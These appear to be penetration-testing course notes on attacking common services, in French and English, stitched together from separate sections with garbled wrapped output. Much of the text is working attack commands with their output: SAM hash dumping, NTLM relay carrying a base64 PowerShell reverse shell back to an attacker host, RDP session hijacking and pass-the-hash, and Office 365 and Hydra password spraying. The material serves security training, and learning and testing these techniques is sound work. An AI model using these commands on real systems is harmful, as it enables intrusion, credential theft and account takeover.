# Attacking Common Services 

```cmd
C:\htb> dir \\192.168.220.129\Finance\
```

Le volume du lecteur \\192.168.220.129\Finance n'a pas d'étiquette.
Numéro de série du volume : ABCD-EFAA

Répertoire de \\192.168.220.129\Finance

```
02/23/2022    11:35 AM    <DIR>          Contracts
              0 File(s)      4,096 bytes
              1 Dir(s)  15,207,469,056 bytes free
```

## Windows CMD - Net Use

La commande `net use` permet de connecter un ordinateur à une ressource partagée, de le déconnecter ou d'afficher des informations sur les connexions réseau.

Nous pouvons nous connecter à un partage de fichiers et mapper son contenu à la lettre de lecteur `n` avec la commande suivante :

```cmd
C:\htb> net use n: \\192.168.220.129\Finance
The command completed successfully.
```

Nous pouvons également fournir un nom d'utilisateur et un mot de passe pour s'authentifier au partage :

```cmd
C:\htb> net use n: \\192.168.220.129\Finance /user:plaintext Password123
The command completed successfully.
```

Une fois le dossier partagé mappé sous la lettre `n`, nous pouvons exécuter des commandes Windows comme si ce dossier partagé était sur notre ordinateur local. Voyons combien de fichiers contient le dossier partagé et ses sous-répertoires.

## Windows CMD - DIR

```cmd
C:\htb> dir n: /a-d /s /b | find /c "\\"
29302
```

Nous avons trouvé 29 302 fichiers. Décomposons la commande :

| Syntaxe  | Description |
|----------|------------|
| `dir`    | Application |
| `n:`     | Répertoire ou lecteur à rechercher |
| `/a-d`   | `/a` est l'attribut, `-d` signifie exclure les répertoires |
| `/s`     | Affiche les fichiers dans le répertoire spécifié et tous ses sous-répertoires |
| `/b`     | Utilise le format simple (sans en-têtes ni résumés) |

La commande suivante :

```cmd
| find /c "\\"
```

Traite la sortie de `dir n: /a-d /s /b` pour compter le nombre de fichiers présents dans le répertoire et les sous-répertoires.

Vous pouvez utiliser `dir /?` pour voir l'aide complète.

Rechercher parmi 29 302 fichiers peut être long, mais les scripts et les utilitaires en ligne de commande peuvent accélérer la recherche. Avec `dir`, nous pouvons rechercher des noms spécifiques dans les fichiers, par exemple :


Certains fichiers peuvent contenir des informations sensibles comme :

```
cred
passwordusers
secrets
key
```

Les extensions de fichiers courantes pour le code source incluent : `.cs`, `.c`, `.go`, `.java`, `.php`, `.asp`, `.aspx`, `.html`.

```cmd
C:\htb> dir n:\*cred* /s /b
n:\Contracts\private\credentials.txt

C:\htb> dir n:\*secret* /s /b
n:\Contracts\private\secret.txt
```

## Windows CMD - Findstr

Si nous voulons rechercher un mot spécifique dans un fichier texte, nous pouvons utiliser `findstr`.

```cmd
C:\htb> findstr /s /i cred n:\*.*
n:\Contracts\private\secret.txt:file with all credentials
n:\Contracts\private\credentials.txt:admin:SecureCredentials!
```

Vous pouvez trouver plus d'exemples sur `findstr` ici.

---

# Windows PowerShell

PowerShell a été conçu pour étendre les capacités de l'invite de commande en exécutant des commandes appelées `cmdlets`. Les `cmdlets` sont similaires aux commandes Windows mais offrent un langage de script plus extensible. Nous pouvons exécuter à la fois des commandes Windows et des `cmdlets` PowerShell dans PowerShell, mais l'invite de commande ne peut exécuter que des commandes Windows.

Reproduisons maintenant les mêmes commandes avec PowerShell.

```powershell
PS C:\htb> Get-ChildItem \\192.168.220.129\Finance\

Directory: \\192.168.220.129\Finance

Mode       LastWriteTime      Length  Name
----       -------------      ------  ----
d-----     2/23/2022 3:27 PM          Contracts
```

Au lieu de `net use`, nous pouvons utiliser `New-PSDrive` dans PowerShell.

```powershell
PS C:\htb> New-PSDrive -Name "N" -Root "\\192.168.220.129\Finance" -PSProvider "FileSystem"
```

| Name | Used (GB) | Free (GB) | Provider | Root |
|------|----------|----------|----------|------|
| N    |          |          | FileSystem | \\192.168.220.129\Finance |

Pour fournir un nom d'utilisateur et un mot de passe avec PowerShell, nous devons créer un objet `PSCredential`. Celui-ci offre une manière centralisée de gérer les noms d'utilisateur, mots de passe et identifiants.

## Windows PowerShell - Objet PSCredential

```powershell
PS C:\htb> $username = 'plaintext'
PS C:\htb> $password = 'Password123'
PS C:\htb> $secpassword = ConvertTo-SecureString $password -AsPlainText -Force
PS C:\htb> $cred = New-Object System.Management.Automation.PSCredential $username, $secpassword
PS C:\htb> New-PSDrive -Name "N" -Root "\\192.168.220.129\Finance" -PSProvider "FileSystem" -Credential $cred
```

## Windows PowerShell - GCI

En PowerShell, nous pouvons utiliser `Get-ChildItem` ou son alias `gci` à la place de `dir`.

```powershell
PS C:\htb> N:
PS N:\> (Get-ChildItem -File -Recurse | Measure-Object).Count
29302
```

Nous pouvons utiliser `-Include` pour rechercher des éléments spécifiques dans un répertoire donné.

```powershell
PS C:\htb> Get-ChildItem -Recurse -Path N:\ -Include *cred* -File

Directory: N:\Contracts\private

Mode       LastWriteTime      Length  Name
----       -------------      ------  ----
-a----     2/23/2022 4:36 PM  25      credentials.txt
```

## Windows PowerShell - Select-String

Le cmdlet `Select-String` utilise les expressions régulières pour rechercher des motifs dans les fichiers et les chaînes d'entrée. Il est similaire à `grep` sous UNIX ou `findstr.exe` sous Windows.

```powershell
PS C:\htb> Get-ChildItem -Recurse -Path N:\ | Select-String "cred" -List
N:\Contracts\private\secret.txt:1:file with all credentials
N:\Contracts\private\credentials.txt:1:admin:SecureCredentials!
```

L'utilisation de la ligne de commande (CLI) permet d'automatiser les tâches récurrentes telles que la gestion des comptes utilisateurs, les sauvegardes nocturnes ou la manipulation de nombreux fichiers. En utilisant des scripts, nous pouvons exécuter ces opérations plus efficacement que via une interface graphique (GUI).

# Linux

Les machines Linux (UNIX) peuvent également être utilisées pour parcourir et monter des partages SMB. Cela fonctionne aussi bien avec un serveur Windows qu'un serveur Samba. Bien que certaines distributions Linux disposent d'une interface graphique, nous nous concentrerons ici sur les outils et utilitaires en ligne de commande pour interagir avec SMB.

## Linux - Montage d'un partage SMB

```bash
sudo mkdir /mnt/Finance
sudo mount -t cifs -o username=plaintext,password=Password123,domain=. //192.168.220.129/Finance /mnt/Finance
```

Comme alternative, nous pouvons utiliser un fichier de configuration des identifiants :

```bash
mount -t cifs //192.168.220.129/Finance /mnt/Finance -o credentials=/path/credentialfile
```

Le fichier `credentialfile` doit être structuré comme suit :

```
username=plaintext
password=Password123
domain=.
```

**Remarque** : Nous devons installer `cifs-utils` pour pouvoir nous connecter à un partage SMB. Pour l'installer, exécutez :

```bash
sudo apt install cifs-utils
```

Une fois le dossier partagé monté, vous pouvez utiliser des outils Linux courants tels que `find` ou `grep` pour explorer la structure des fichiers.

### Recherche d'un fichier contenant une chaîne spécifique :

```bash
find /mnt/Finance/ -name *cred*
/mnt/Finance/Contracts/private/credentials.txt
```

### Recherche d'un contenu spécifique dans les fichiers :

```bash
grep -rn /mnt/Finance/ -ie cred
/mnt/Finance/Contracts/private/credentials.txt:1:admin:SecureCredentials!
/mnt/Finance/Contracts/private/secret.txt:1:file with all credentials
```

# Command Line Utilities

## MSSQL

### Linux - SQSH

```bash
sqsh -S 10.129.20.13 -U username -P Password123
```

### Windows - SQLCMD

```cmd
C:\htb> sqlcmd -S 10.129.20.13 -U username -P Password123
```

## MySQL

### Linux - MySQL

```bash
mysql -u username -pPassword123 -h 10.129.20.13
```

### Windows - MySQL

```cmd
C:\htb> mysql.exe -u username -pPassword123 -h 10.129.20.13
```

# Outils

Il est essentiel de se familiariser avec les utilitaires en ligne de commande par défaut disponibles pour interagir avec différents services. Cependant, à mesure que nous avançons dans ce domaine, nous trouverons des outils qui peuvent nous aider à être plus efficaces. Ces outils sont souvent créés par la communauté. Cependant, avec le temps, nous aurons des idées sur la façon d'améliorer un outil ou de créer nos propres outils. Même si nous ne sommes pas des développeurs à temps plein, plus nous nous familiarisons avec le "hacking", plus nous apprenons, et plus nous nous retrouvons à chercher un outil qui n'existe pas encore, ce qui peut être une occasion d'apprendre et de créer nos propres outils.

## Outils pour interagir avec des services communs

| SMB           | FTP          | Email          | Bases de données       |
|---------------|--------------|----------------|------------------------|
| smbclient     | ftp          | Thunderbird     | mssql-cli              |
| CrackMapExec  | clftp        | Claws           | mycli                  |
| SMBMap        | ncftp        | Geary           | mssqlclient.py         |
| Impacket      | filezilla    | MailSpring      | dbeaver                |
| psexec.py     | crossftp     | mutt            | MySQL Workbench        |
| mailutils     |              |                | SQL Server Management Studio (SSMS) |
| smbexec.py    |              |                |                        |
| sendEmail     |              |                |                        |
| swaks         |              |                |                        |
| sendmail      |              |                |                        |

## Dépannage général

En fonction de la version de Windows ou de Linux avec laquelle nous travaillons ou que nous ciblons, nous pouvons rencontrer différents problèmes lorsque nous essayons de nous connecter à un service.

Voici quelques raisons pour lesquelles nous pourrions ne pas avoir accès à une ressource :
- Authentification
- Privilèges
- Connexion réseau
- Règles de pare-feu
- Support du protocole

Gardez à l'esprit que nous pouvons rencontrer différentes erreurs en fonction du service que nous ciblons. Nous pouvons utiliser les codes d'erreur à notre avantage et rechercher de la documentation officielle ou des forums où des personnes ont résolu un problème similaire au nôtre.

## Le concept des attaques

Pour comprendre efficacement les attaques sur les différents services, nous devons examiner comment ces services peuvent être attaqués. Un concept est un plan global qui est appliqué à des projets futurs. Par exemple, nous pouvons penser au concept de construction d'une maison. De nombreuses maisons ont un sous-sol, quatre murs et un toit. La plupart des maisons sont construites de cette manière, et c'est un concept appliqué dans le monde entier. Les détails plus fins, tels que le matériau utilisé ou le type de design, sont flexibles et peuvent être adaptés aux souhaits et aux circonstances individuelles. Cet exemple montre qu'un concept nécessite une catégorisation générale (sol, murs, toit).

Dans notre cas, nous devons créer un concept pour les attaques sur tous les services possibles et le diviser en catégories qui résument tous les services tout en laissant les méthodes d'attaque individuelles.

Pour expliquer plus clairement ce dont nous parlons ici, nous pouvons essayer de regrouper les services SSH, FTP, SMB et HTTP et essayer de déterminer ce que ces services ont en commun. Ensuite, nous devons créer une structure qui nous permettra d'identifier les points d'attaque de ces différents services en utilisant un seul modèle.

L'analyse des points communs et la création de modèles de motifs qui s'appliquent à tous les cas envisageables ne constitue pas un produit fini, mais plutôt un processus qui permet à ces modèles de se développer de plus en plus. C'est pourquoi nous avons créé un modèle de motif pour ce sujet afin de vous aider à enseigner et expliquer plus efficacement le concept derrière les attaques.


## Extract Hashes from SAM Database

The Security Account Manager (SAM) is a database file that stores users' passwords. It can
be used to authenticate local and remote users. If we get administrative privileges on a
machine, we can extract the SAM database hashes for different purposes:
Authenticate as another user.
Password Cracking, if we manage to crack the password, we can try to reuse the
password for other services or accounts.

Pass The Hash. We will discuss it later in this section.
```bash
crackmapexec smb 10.10.110.17 -u administrator -p 'Password123!' --sam
SMB
10.10.110.17 445
WIN7BOX
[*] Windows 10.0 Build 18362
(name:WIN7BOX) (domain:WIN7BOX) (signing:False) (SMBv1:False)
SMB
10.10.110.17 445
WIN7BOX
[+]
WIN7BOX\administrator:Password123! (Pwn3d!)
SMB
10.10.110.17 445
WIN7BOX [+] Dumping SAM hashes
SMB
10.10.110.17 445
WIN7BOX
Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd
18041b8fe:::
SMB
10.10.110.17 445
WIN7BOX
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c
0:::
SMB
10.10.110.17 445
WIN7BOX
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59
d7e0c089c0:::
SMB
10.10.110.17 445
WIN7BOX
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:5717e1619e16b9179e
f2e7138c749d65:::SMB
10.10.110.17 445
WIN7BOX
jurena:1001:aad3b435b51404eeaad3b435b51404ee:209c6174da490caeb422f3fa5a7ae
634:::
SMB
10.10.110.17 445
WIN7BOX
demouser:1002:aad3b435b51404eeaad3b435b51404ee:4c090b2a4a9a78b43510ceec3a6
0f90b:::
SMB
10.10.110.17 445
WIN7BOX
[+] Added 6 SAM hashes to the
database
```

Then we execute impacket-ntlmrelayx with the option --no-http-server , -
smb2support , and the target machine with the option -t . By default, impacket-
ntlmrelayx will dump the SAM database, but we can execute commands by adding the
option -c .
```bash
impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.110.146
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
<SNIP>
[*] Running in relay mode to single host
[*] Setting up SMB Server
[*] Setting up WCF Server
[*] Servers started, waiting for connections
[*] SMBD-Thread-3: Connection from /[email protected] controlled,
attacking target smb://10.10.110.146
[*] Authenticating against smb://10.10.110.146 as /ADMINISTRATOR SUCCEED
[*] SMBD-Thread-3: Connection from /[email protected] controlled, but
there are no more targets left![*] SMBD-Thread-5: Connection from /[email protected] controlled, but
there are no more targets left!
[*] Service RemoteRegistry is in stopped state
[*] Service RemoteRegistry is disabled, enabling it
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0xeb0432b45874953711ad55884094e9d4
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd
18041b8fe:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c
0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59
d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:92512f2605074cfc34
1a7f16e5fabf08:::
demouser:1000:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c
089c0:::
test:1001:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8f
e:::
[*] Done dumping SAM hashes for host: 10.10.110.146
[*] Stopping service RemoteRegistry
[*] Restoring the disabled state for service RemoteRegistry
We can create a PowerShell reverse shell using https://www.revshells.com/, set our machine
IP address, port, and the option Powershell #3 (Base64).
```
```bash
impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c
'powershell -e
JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALg
BOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAx
ADYAOAAuADIAMgAwAC4AMQAzADMAIgAsADkAMAAwADEAKQA7ACQAcwB0AHIAZQBhAG0AIAA9AC
AAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0A
XQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbA
BlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAs
ACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7AD
sAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEA
bQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZw
ApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABz
AGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8AC
AATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQA
cwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdA
BoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAu
AGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoAC
QAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMA
ZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOw
AkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA'
```

Once the victim authenticates to our server, we poison the response and make it execute our
command to obtain a reverse shell.

```bash
nc -lvnp 9001
listening on [any] 9001 ...
connect to [10.10.110.133] from (UNKNOWN) [10.10.110.146] 52471
PS C:\Windows\system32> whoami;hostname
nt authority\system
WIN11BOX
```

To successfully impersonate a user without their password, we need to have SYSTEM
privileges and use the Microsoft tscon.exe binary that enables users to connect to another
desktop session. It works by specifying which SESSION ID ( 4 for the lewen session in our
example) we would like to connect to which session name ( rdp-tcp#13 , which is our
current session). So, for example, the following command will open a new console as the
specified SESSION_ID within our current RDP session:
C:\htb> tscon #{TARGET_SESSION_ID} /dest:#{OUR_SESSION_NAME}
If we have local administrator privileges, we can use several methods to obtain SYSTEM
privileges, such as PsExec or Mimikatz. A simple trick is to create a Windows service that, by
default, will run as Local System and will execute any binary with SYSTEM privileges. Wewill use Microsoft sc.exe binary. First, we specify the service name ( sessionhijack ) and
the binpath , which is the command we want to execute. Once we run the following
command, a service named sessionhijack will be created.
C:\htb> query user
USERNAMESESSIONNAMEIDSTATEIDLE TIME
LOGON
TIME
>juurenardp-tcp#131Active78/25/2021
rdp-tcp#142Active*8/25/2021
1:23 AM
lewen
1:28 AM
C:\htb> sc.exe create sessionhijack binpath= "cmd.exe /k tscon 2
/dest:rdp-tcp#13"
[SC] CreateService SUCCESS


To run the command, we can start the sessionhijack service :
C:\htb> net start sessionhijack

RDP Pass-the-Hash (PtH)
We may want to access applications or software installed on a user's Windows system that
is only available with GUI access during a penetration test. If we have plaintext credentials
for the target user, it will be no problem to RDP into the system. However, what if we only
have the NT hash of the user obtained from a credential dumping attack such as SAM
database, and we could not crack the hash to reveal the plaintext password? In some
instances, we can perform an RDP PtH attack to gain GUI access to the target system using
tools like xfreerdp .
There are a few caveats to this attack:
Restricted Admin Mode , which is disabled by default, should be enabled on the
target host; otherwise, we will be prompted with the following error:This can be enabled by adding a new registry key DisableRestrictedAdmin
(REG_DWORD) under HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa . It
can be done using the following command:
Adding the DisableRestrictedAdmin Registry Key
C:\htb> reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v
DisableRestrictedAdmin /d 0x0 /f
Once the registry key is added, we can use xfreerdp with the option /pth to gain RDP
access:[!bash!]# xfreerdp /v:192.168.220.152 /u:lewen
/pth:300FF5E89EF33F83A8146C10F5AB9BB9
[09:24:10:115] [1668:1669] [INFO][com.freerdp.core] -
freerdp_connect:freerdp_set_last_error_ex resetting error state
[09:24:10:115] [1668:1669] [INFO][com.freerdp.client.common.cmdline] -
loading channelEx rdpdr
[09:24:10:115] [1668:1669] [INFO][com.freerdp.client.common.cmdline] -
loading channelEx rdpsnd
[09:24:10:115] [1668:1669] [INFO][com.freerdp.client.common.cmdline] -
loading channelEx cliprdr
[09:24:11:427] [1668:1669] [INFO][com.freerdp.primitives] - primitives
autodetect, using optimized
[09:24:11:446] [1668:1669] [INFO][com.freerdp.core] -
freerdp_tcp_is_hostname_resolvable:freerdp_set_last_error_ex resetting
error state
[09:24:11:446] [1668:1669] [INFO][com.freerdp.core] -
freerdp_tcp_connect:freerdp_set_last_error_ex resetting error state
[09:24:11:464] [1668:1669] [WARN][com.freerdp.crypto] - Certificate
verification failure 'self signed certificate (18)' at stack position 0
[09:24:11:464] [1668:1669] [WARN][com.freerdp.crypto] - CN = dc-
01.superstore.xyz
[09:24:11:464] [1668:1669] [INFO][com.winpr.sspi.NTLM] - VERSION ={
[09:24:11:464] [1668:1669] [INFO][com.winpr.sspi.NTLM] -
ProductMajorVersion: 6
[09:24:11:464] [1668:1669] [INFO][com.winpr.sspi.NTLM] -
ProductMinorVersion: 1
[09:24:11:464] [1668:1669] [INFO][com.winpr.sspi.NTLM] -
ProductBuild: 7601
[09:24:11:464] [1668:1669] [INFO][com.winpr.sspi.NTLM] -
0x000000
Reserved:
[09:24:11:464] [1668:1669] [INFO][com.winpr.sspi.NTLM] -
NTLMRevisionCurrent: 0x0F
[09:24:11:567] [1668:1669] [INFO][com.winpr.sspi.NTLM] - negotiateFlags
"0xE2898235"
<SNIP>
If it works, we'll now be logged in via RDP as the target user without knowing their cleartext
password.


Subdomain Enumeration
Before performing a subdomain takeover, we should enumerate subdomains for a target
domain using tools like Subfinder. This tool can scrape subdomains from open sources like
DNSdumpster. Other tools like Sublist3r can also be used to brute-force subdomains by
supplying a pre-generated wordlist:
[!bash!]# ./subfinder -d inlanefreight.com -v
_
__ _
_
____ _| |__ / _(_)_ _ __| |___ _ _
(_-< || | '_ \ _| | ' \/ _ / -_) '_|
/__/\_,_|_.__/_| |_|_||_\__,_\___|_| v2.4.5
projectdiscovery.io
[WRN] Use with caution. You are responsible for your actions
[WRN] Developers assume no liability and are not responsible for any
misuse or damage.
[WRN] By using subfinder, you also agree to the terms of the APIs used.
[INF] Enumerating subdomains for inlanefreight.com
[alienvault] www.inlanefreight.com
[dnsdumpster] ns1.inlanefreight.com
[dnsdumpster] ns2.inlanefreight.com
...snip...
[bufferover] Source took 2.193235338s for enumeration
ns2.inlanefreight.com
www.inlanefreight.com
ns1.inlanefreight.comsupport.inlanefreight.com
[INF] Found 4 subdomains for inlanefreight.com in 20 seconds 11
milliseconds
An excellent alternative is a tool called Subbrute. This tool allows us to use self-defined
resolvers and perform pure DNS brute-forcing attacks during internal penetration tests on
hosts that do not have Internet access.
Subbrute
git clone https://github.com/TheRook/subbrute.git >> /dev/null 2>&1
cd subbrute
echo "ns1.inlanefreight.com" > ./resolvers.txt
./subbrute inlanefreight.com -s ./names.txt -r ./resolvers.txt
Warning: Fewer than 16 resolvers per process, consider adding more
nameservers to resolvers.txt.
inlanefreight.com
ns2.inlanefreight.com
www.inlanefreight.com
ms1.inlanefreight.com
support.inlanefreight.com
<SNIP>


Cloud Enumeration
As discussed, cloud service providers use their own implementation for email services.
Those services commonly have custom features that we can abuse for operation, such as
username enumeration. Let's use Office 365 as an example and explore how we can
enumerate usernames in this cloud platform.
O365spray is a username enumeration and password spraying tool aimed at Microsoft Office
365 (O365) developed by ZDH. This tool reimplements a collection of enumeration and
spray techniques researched and identified by those mentioned in Acknowledgments. Let's
first validate if our target domain is using Office 365.
O365 Spray
python3 o365spray.py --validate --domain msplaintext.xyz
*** O365 Spray ***
>----------------------------------------<
> version:2.0.4
> domain
> validate:
:msplaintext.xyz
True
> timeout:25 seconds
> start:2022-04-13 09:46:40
>----------------------------------------<
[2022-04-13 09:46:40,344] INFO : Running O365 validation for:
msplaintext.xyz
[2022-04-13 09:46:40,743] INFO : [VALID] The following domain is using
O365: msplaintext.xyzNow, we can attempt to identify usernames.
python3 o365spray.py --enum -U users.txt --domain msplaintext.xyz
*** O365 Spray ***
>----------------------------------------<
> version:2.0.4
> domain:msplaintext.xyz
> enum:True
> userfile:users.txt
> enum_module
> rate:
:office
10 threads
> timeout:25 seconds
> start:2022-04-13 09:48:03
>----------------------------------------<
[2022-04-13 09:48:03,621] INFO : Running O365 validation for:
msplaintext.xyz
[2022-04-13 09:48:04,062] INFO : [VALID] The following domain is using
O365: msplaintext.xyz
[2022-04-13 09:48:04,064] INFO : Running user enumeration against 67
potential users
[2022-04-13 09:48:08,244] INFO : [VALID] [email protected]
[2022-04-13 09:48:10,415] INFO : [VALID] [email protected]
[2022-04-13 09:48:10,415] INFO :
[ * ] Valid accounts can be found at:
'/opt/o365spray/enum/enum_valid_accounts.2204130948.txt'
[ * ] All enumerated accounts can be found at:
'/opt/o365spray/enum/enum_tested_accounts.2204130948.txt'
[2022-04-13 09:48:10,416] INFO : Valid Accounts: 2

Password Attacks
We can use Hydra to perform a password spray or brute force against email services such
as SMTP , POP3 , or IMAP4 . First, we need to get a username list and a password list and
specify which service we want to attack. Let us see an example for POP3 .
Hydra - Password Attackhydra -L users.txt -p 'Company01!' -f 10.10.110.20 pop3
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use
in military or secret service organizations or for illegal purposes (this
is non-binding, these *** ignore laws and ethics anyway).
Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-04-13
11:37:46
[INFO] several providers have implemented cracking protection, check with
a small wordlist first - and stay legal!
[DATA] max 16 tasks per 1 server, overall 16 tasks, 67 login tries
(l:67/p:1), ~5 tries per task
[DATA] attacking pop3://10.10.110.20:110/
[110][pop3] host: 10.129.42.197
login: john
password: Company01!
1 of 1 target successfully completed, 1 valid password found
If cloud services support SMTP, POP3, or IMAP4 protocols, we may be able to attempt to
perform password spray using tools like Hydra , but these tools are usually blocked. We can
instead try to use custom tools such as o365spray or MailSniper for Microsoft Office 365 or
CredKing for Gmail or Okta. Keep in mind that these tools need to be up-to-date because if
the service provider changes something (which happens often), the tools may not work
anymore. This is a perfect example of why we must understand what our tools are doing and
have the know-how to modify them if they do not work properly for some reason.
O365 Spray - Password Spraying
python3 o365spray.py --spray -U usersfound.txt -p 'March2022!' --count 1 -
-lockout 1 --domain msplaintext.xyz
*** O365 Spray ***
>----------------------------------------<
> version:2.0.4
> domain:msplaintext.xyz
> spray:True
> password:March2022!
> userfile:usersfound.txt
> count
> lockout:
:1 passwords/spray
1.0 minutes
> spray_module:oauth2
> rate:10 threads
> safe:10 locked accounts
> timeout:25 seconds
> start:2022-04-14 12:26:31>----------------------------------------<
[2022-04-14 12:26:31,757] INFO : Running O365 validation for:
msplaintext.xyz
[2022-04-14 12:26:32,201] INFO : [VALID] The following domain is using
O365: msplaintext.xyz
[2022-04-14 12:26:32,202] INFO : Running password spray against 2 users.
[2022-04-14 12:26:32,202] INFO : Password spraying the following
passwords: ['March2022!']
[2022-04-14 12:26:33,025] INFO : [VALID] [email protected]:March2022!
[2022-04-14 12:26:33,048] INFO :
[ * ] Writing valid credentials to:
'/opt/o365spray/spray/spray_valid_credentials.2204141226.txt'
[ * ] All sprayed credentials can be found at:
'/opt/o365spray/spray/spray_tested_credentials.2204141226.txt'
[2022-04-14 12:26:33,048] INFO : Valid Credentials: 1
